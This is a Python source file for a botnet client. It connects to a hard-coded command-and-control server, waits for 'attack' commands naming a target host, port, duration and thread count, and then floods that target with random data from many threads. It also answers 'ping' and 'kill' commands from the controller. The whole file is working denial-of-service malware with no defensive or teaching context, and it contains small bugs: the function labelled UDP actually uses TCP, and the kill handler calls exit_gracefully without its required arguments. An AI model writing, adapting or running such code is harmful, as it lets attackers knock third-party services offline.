import sys, random
import socket, signal
from typing import Tuple
from time import time, sleep
from threading import Thread

class Client():
    run = False

    def __init__(self, connect:Tuple[str, int]=("192.168.178.100", 6969)) -> None:
        signal.signal(signal.SIGINT, self.exit_gracefully)
        signal.signal(signal.SIGTERM, self.exit_gracefully)
        self.stop = False
        self.run = False

        while not self.stop:
            try:
                self._connect(connect)
            except KeyboardInterrupt:
                continue
            except Exception as e:
                print(f"Error connecting {connect}| Sleep 5 seconds")
                sleep(5)

    def exit_gracefully(self,signum, frame):
        print("\nExiting....")
        self.stop = True
        self.run = False
        self.sock.close()
        sleep(1)
        sys.exit(0)

    def _attack(self, *args):

        def udp(*args):
            t1 = time()
            host, port = args[1], args[2]

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            bytes = random._urandom(10240)
            s.connect((host, int(port)))
            
            while self.run:
                if not self.run: break
                s.sendto(bytes, (host, int(port)))
            
            s.close()
            print("run time {}".format(time()-t1))

        # type(0) host(1) port(2) time(3) threads(4)
        if args[0] == "udp":
            for n in range(args[4]):
                Thread(target=udp, args=[*args]).start()

        sleep(int(args[3]))
        self.run = False
        
    def _connect(self, connect:Tuple[str,int]) -> None:
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect(connect)
        self.start()

    def _recv(self):
        return self.sock.recv(1024).decode("ascii").lower()
    
    def start(self):
        while True:
            data = self._recv()

            if "attack" in data:
                data = data.replace("attack ", "").split()
                try:
                    proto, ip, port, sec, workers = data
                    data = proto, ip, int(port), int(sec), int(workers)
                    self.sock.send("done".encode("ascii"))
                except Exception as e:
                    print(e)
                    self.sock.send("[-] Attack Failed".encode("ascii"))
                    break

                self.run = True
                Thread(target=self._attack, args=data).start()

            elif "kill" in data:
                self.sock.send(str.encode("Server Stopped"))
                self.run=False
                self.exit_gracefully()

            elif "ping" in data:
                self.sock.send(str.encode("Pong"))

            else:
                self.sock.send(str.encode("ERROR"))

if __name__ == '__main__':

    Client()